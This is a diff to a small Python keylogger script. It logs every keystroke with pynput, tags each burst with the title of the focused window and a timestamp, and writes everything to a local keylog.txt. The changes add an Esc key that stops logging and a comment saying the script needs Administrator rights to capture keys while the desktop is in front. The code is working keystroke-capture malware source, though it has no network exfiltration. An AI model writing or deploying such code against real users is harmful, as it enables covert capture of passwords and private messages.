@@ -5,17 +5,19 @@ from pynput import keyboard
 import win32gui  #interacting with the windows gui
 
 
-# ── Config ────────────────────────────────────────────────
+# config
+# On Windows: to capture keys when the DESKTOP has focus, run this script as Administrator
+# (UIPI blocks low-level hooks for non-elevated processes when Explorer/Desktop is foreground).
 LOG_FILE = os.path.join(os.path.dirname(__file__), "keylog.txt")
 
-# ── Setup logging ─────────────────────────────────────────
+# setup logging
 logging.basicConfig(
     filename=LOG_FILE,
     level=logging.DEBUG,
     format="%(message)s"
 )
 
-# ── Helpers ───────────────────────────────────────────────
+# check the active window
 def get_active_window():
     """Returns the title of the currently focused window."""
     try:
@@ -23,25 +25,29 @@ def get_active_window():
     except:
         return "Unknown"
 
-current_window = ""
+current_window = "" 
 
 def on_press(key):
+    if key == keyboard.Key.esc:
+        return False
+        
     global current_window
 
     # Check if the user switched windows
     active = get_active_window()
     if active != current_window:
-        current_window = active
+        current_window = active #update the current window
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         logging.info(f"\n\n[{timestamp}] Window: {active}")
+    
 
     # Log the key
     try:
-        logging.info(f"{key.char}")          # regular character
+        logging.info(f"{key.char}")          # regular character (character is the key pressed)         
     except AttributeError:
         logging.info(f"[{key}]")             # special key e.g. [Key.space]
 
-# ── Main ──────────────────────────────────────────────────
+# main
 def start():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
